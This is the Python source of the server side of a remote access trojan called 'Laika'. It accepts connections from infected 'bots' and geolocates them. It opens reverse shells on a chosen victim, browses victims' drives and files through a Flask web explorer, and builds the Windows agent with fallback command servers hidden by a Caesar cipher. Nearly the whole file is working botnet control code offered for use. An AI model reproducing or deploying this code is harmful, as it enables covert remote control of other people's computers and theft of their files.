from colorama import Fore, Style
from prettytable import PrettyTable
from geoip import geolite2
from flask import Flask, request, send_file, render_template, send_from_directory, jsonify
from threading import Thread
import os, sys, time
import select
import socket
import logging
import urllib.parse
import math

ADRESSE = "192.168.1.35"#socket.gethostname()
PORT = 4444 
CONNECT_CLIENTS = [] #liste des sockets ouverts
THREAD_LIST = [] #tout les threads
CAESAR_KEY = 5
SELECTED_CLIENT = -1

serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serveur.bind((ADRESSE, PORT))

def is_linux_user() -> bool :
    platform = sys.platform
    return platform == "linux" or platform == "linux2"

def CAESAR(in_s: str) -> str :
    r=""
    for c in in_s :
        try :
            r+=chr(ord(c)+CAESAR_KEY)
        except :
            r+=" "
    return r

def CAESAR_DECRYPT(in_s: str) -> str :
    r=""
    for c in in_s :
        try :
            r+=chr(ord(c)-CAESAR_KEY)
        except :
            r+=" "
    return r

def convert_size(size_bytes):
    if size_bytes == 0:
        return "0 O"
    size_name = ("O", "Ko", "Mo", "Go", "To", "Po", "Eo", "Zo", "Yo")
    try :
        i = int(math.floor(math.log(size_bytes, 1024)))
    except : 
        return "N"
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return "%s %s" % (s, size_name[i])

app = Flask(__name__) 
# Disable Flask's default logging
log = logging.getLogger('werkzeug')
log.disabled = True

@app.route('/<path:filename>')
def serve_file(filename):
    file_path = os.path.join(app.root_path, 'FileExplorer', filename)
    return send_from_directory(os.path.dirname(file_path), os.path.basename(file_path))

@app.route('/')
def index() :
    index_path = os.path.join(os.getcwd(), 'FileExplorer/index.html')
    return send_file(index_path)

path_file_ex = ""

@app.route('/interact', methods=['POST'])
def interact() :
    file_list = request.get_json()["to_send"]
    action = file_list.pop(0)
    
    print(file_list)
    match action :
        case "download" :
            print("d")

        case "upload" :
            print("u")

        case "remove" :
            print("r")

    return 'ok'

FILES_=[]
@app.route('/get_data', methods=['POST'])
def get_data() :
    global path_file_ex
    global FILES_
    data = []
    
    got_path = request.get_data().decode("latin-1")
    got_path = urllib.parse.unquote_plus(got_path)
    if got_path and got_path != "{}" :
        if "img" in got_path : got_path = got_path.split("centered\">")[1]
        got_path = got_path.replace("<a>","").replace("</a>","").replace("folder_path=","")

        if got_path == ".." :
            folders = path_file_ex.split("/")
            if folders != [".."] and folders != [""] : 
                folders.pop()
                folders.pop()
                path_file_ex = '/'.join(folders)
                if path_file_ex != "" :
                    path_file_ex += "/"
        else :
            path_file_ex += got_path + "/"

    else :
        path_file_ex = ""

    i = -1
    if CONNECT_CLIENTS != [] :
        data.append({"url" : f"<a>..</a>", "modified":"", "size" : ""})

    for client in CONNECT_CLIENTS :
        i += 1
        if len(path_file_ex.split("/")) == 1 or path_file_ex == "" :
            data.append({"url" : f"<a>Client n°{i}</a>", "modified":"", "size" : ""})
            continue

        if len(path_file_ex.split("/")) == 2 :
            #getting drive letters
            path_parts = path_file_ex.split("/")
            client_num = int(path_parts.pop(0).replace("Client n°",""))
            if client_num != i : continue
            client.send(CAESAR("get_drives").encode())
            drives = recv_message_ret(client).decode("utf-8")
            for d in drives :
                data.append({"url": f"<a>{d}</a>", "modified": "", "size":""})
            continue

        else :
            client.send(CAESAR("get_file_list").encode())
            path_parts = path_file_ex.split("/")
            client_num = int(path_parts.pop(0).replace("Client n°",""))
            if client_num != i : continue
            path_parts[0] = path_parts[0] + ":"
            
            if path_parts[len(path_parts)-2] in FILES_ :
                path_parts.pop(len(path_parts)-2)
                path_file_ex_parts = path_file_ex.split("/")
                path_file_ex_parts.pop(len(path_file_ex_parts)-2)
                path_file_ex = '/'.join(path_file_ex_parts)

            path_file_ex_2 = '/'.join(path_parts)
            client.send(CAESAR(path_file_ex_2 + "\0").encode())
           
            files = recv_message_ret(client).decode("latin-1")
            FILES_ = []
            for f in files.split("/") :
                f = CAESAR_DECRYPT(f)
                #print(path_file_ex + f)

                client.send(CAESAR("get_obj_info").encode())

                client.send(CAESAR(path_file_ex_2 + f + "\0").encode())
                
                infos = recv_message_ret(client).decode("latin-1")
                taille, modified = infos.split("/")
                
                is_dir = False
                if taille != "N" :
                    taille = convert_size(int(taille))
                    if taille == "0 O" :
                        is_dir = True
                    else :
                        FILES_.append(f)
                
                if is_dir :
                    data.append({"url": f"<img src=\"images/folder.png\" alt=\"Folder Icon\" class=\"mr-3\" id=\"folder\" /><a class=\"centered\">{f}</a>",
                                 "modified": f"{modified}", "size": f"{taille}"})
                else :
                    data.append({"url": f"<img src=\"images/file.png\" alt=\"File Icon\" class=\"mr-3\" id=\"folder\" /><a class=\"centered\">{f}</a>",
                                 "modified": f"{modified}", "size": f"{taille}"})
                
    json_data = jsonify({"data":data})
    return json_data

def ban() :
    if is_linux_user() :
        os.system("clear")
    else :
        os.system("title Laika - 0 bots")
        os.system("cls")
    print(Fore.RED + "   __         _  _          ")
    print(Fore.RED + "  / /   __ _ (_)| | __ __ _ ")
    print(Fore.RED + " / /   / _` || || |/ // _` |")
    print(Fore.RED + "/ /___| (_| || ||   <| (_| |")
    print(Fore.RED + "\____/ \__,_||_||_|\_\\\__,_|")
    print(Style.BRIGHT + Fore.GREEN +"Là où finit l'État, commence l'arc-en-ciel." + Fore.RESET + Style.RESET_ALL)
    print("")

def on_new_client() -> None :
    while True :
        serveur.listen(1)
        client, adresseClient = serveur.accept()
        client.setblocking(0)
        CONNECT_CLIENTS.append(client)

def on_close_socket() -> None:
    global CONNECT_CLIENTS
    global SELECTED_CLIENT
    while True :
        for s in CONNECT_CLIENTS :
            try:
                # this will try to read bytes without blocking and also without removing them from buffer (peek only)
                data = s.recv(16, socket.MSG_PEEK)
                if len(data) == 0:
                    if CONNECT_CLIENTS.index(s) == SELECTED_CLIENT : SELECTED_CLIENT = -1
                    CONNECT_CLIENTS.remove(s)
            except BlockingIOError:
                pass  # socket is open and reading from it would block
            except ConnectionResetError:
                if CONNECT_CLIENTS.index(s) == SELECTED_CLIENT : SELECTED_CLIENT = -1
                CONNECT_CLIENTS.remove(s)  # socket was closed for some other reason
            except Exception as e:
                pass

def update_title() -> None :
    if is_linux_user() :
        return # marche pas encore, nsm linux

    while True :
        if SELECTED_CLIENT == -1 :
            os.system("title Laika ^| "+str(len(CONNECT_CLIENTS))+" bots")
        else :
            os.system("title Laika ^| "+str(len(CONNECT_CLIENTS))+" bots - Selection : n°" + str(SELECTED_CLIENT))
        time.sleep(2)

def recv_message_ret(client) :
    message = ""
    while True :
        client.settimeout(0.1)
        try :
            message = client.recv(4096)
            if CAESAR_DECRYPT(message.decode("latin-1")) == "done" :
                break
        except socket.timeout :
            break
        if not message:
            break
        
        if client.gettimeout() == 0:
            break
    
    return message

def recv_message(socket_object) -> bool:
    socket_object.settimeout(0.1)
    while True:
        try :
            message = socket_object.recv(4096)
            if CAESAR_DECRYPT(message.decode("latin-1")) == "Laika: session ended" :
                return False
        except socket.timeout :
            break
        if not message:
            break
        print(CAESAR_DECRYPT(message.decode("latin-1")), end="")
        if socket_object.gettimeout() == 0:
            break
    
    return True

def main() -> None :
    global SELECTED_CLIENT

    THREAD_LIST.append(Thread(target = on_new_client, args = ()))
    THREAD_LIST.append(Thread(target = on_close_socket, args = ()))
    THREAD_LIST.append(Thread(target = update_title, args = ()))
    THREAD_LIST.append(Thread(target = app.run, kwargs = {"debug":False}))
    
    for t in THREAD_LIST :
        t.daemon = True
        t.start()
    
    time.sleep(1)
    ban()

    while True :
        cmd = input(Fore.LIGHTBLUE_EX +"-> " + Fore.RESET)

        if cmd == "help" :
            print("")
            print("help : montre ce message")
            print("clear : efface l'écran")
            print("clients : montre les clients connectés")
            print("select <ID> : sélectionne le client avec lequel intéragir")
            print("deselect : désélectionne le client précédemment séléctionné avec \"select\"")
            print("shell : ouvre un reverse shell dans le client précédemment séléctionné avec \"select\"")
            print("build : build un client")
            print("fex : ouvre l'explorateur de fichiers")
            print("")

        elif cmd == "exit" :
            for c in CONNECT_CLIENTS :
                c.close()
            sys.exit(0)

        elif cmd == "clear" :
            ban()

        elif cmd == "build" :
            print("")
            nb_fallbacks = input("Nombre de serveurs de fallback : ")
             
            if not nb_fallbacks.isdigit() or int(nb_fallbacks) < 0 : 
                print(f"\"{nb_fallbacks}\" n'est pas un nombre valide.")
                continue
            
            ips = {} 
            for i in range(1, int(nb_fallbacks)+1) :
                while True :
                    s_ip = input(f"IP du serveur {i} : ")
                    if "." in s_ip : #technique de shlag mais un nom de domaine peut pas être vérifié avec socket du coup on check juste le "."
                        s_port = input(f"Port du serveur {i} : ")
                        ips[CAESAR(s_ip)] = int(s_port)
                        break
            
            print("")
            print("Écriture de la config...")
            with open("../Laika/config.h", "w") as config :
                config.write(f"#define FALLBACK_SERVERS {nb_fallbacks}\n\n")
                config.write("char* fallback_servers["+nb_fallbacks+"] = {\n")
                for ip in ips.keys() :
                    config.write(f"\t\"{ip}\",\n")
                config.write("};\n\n")
                
                config.write("int fallback_servers_ip["+nb_fallbacks+"] = {\n")
                for port in ips.values() :
                    config.write(f"\t{port},\n")
                config.write("};")
            print("Config écrite")
            
            print("")
            print("Compilation de l'agent..")
            vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
            cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"

            os.system("\""+cmd_line+"\" ../Laika /p:Configuration=Release;Platform=x86")

        elif cmd == "clients" :
            print("")
            x = PrettyTable()
            x.field_names = ["ID", "IP", "PORT", "PAYS"]

            for i in range(0,len(CONNECT_CLIENTS)) :
                c = CONNECT_CLIENTS[i]
                addr = c.getpeername()[0]
                pays = ""
                match = geolite2.lookup(addr)

                if match is not None :
                    pays = match.country

                x.add_row([i, addr, PORT, pays])
            
            print(x)
            print()

        elif "select " in cmd :
            id = cmd.replace("select ","")
            if not id.isdigit() or int(id) < 0 or len(CONNECT_CLIENTS) < 1 or int(id) > len(CONNECT_CLIENTS)-1 :
                print(f"\"{id}\" n'est pas un ID valide.")
                continue

            SELECTED_CLIENT = int(id)
            print(f"Client numéro : {SELECTED_CLIENT} sélectionné.")

        elif cmd == "deselect":
            if SELECTED_CLIENT == -1 :
                print("Vous n'avez aucun client sélectionné.")
            else :
                print(f"Client {SELECTED_CLIENT} déselectionné.")
                SELECTED_CLIENT = -1

        elif cmd == "shell" :
            if SELECTED_CLIENT == -1 :
                print("Vous n'avez aucun client sélectionné.")
                continue
            
            client = CONNECT_CLIENTS[SELECTED_CLIENT]
            client.send(CAESAR("shell").encode())

            time.sleep(1)

            while True :
                if not recv_message(client) : break
                command = input("")
                client.send(CAESAR(command+"\n").encode())
            
            print("\nSession terminée.")
        
        elif cmd == "fex" :
            print("\nClique sur le lien ci-dessous pour voir le file explorer :")
            print("http://127.0.0.1:5000\n")

        else :
            print("Commande non reconnue, \"help\" pour afficher la liste des commandes.")

main()
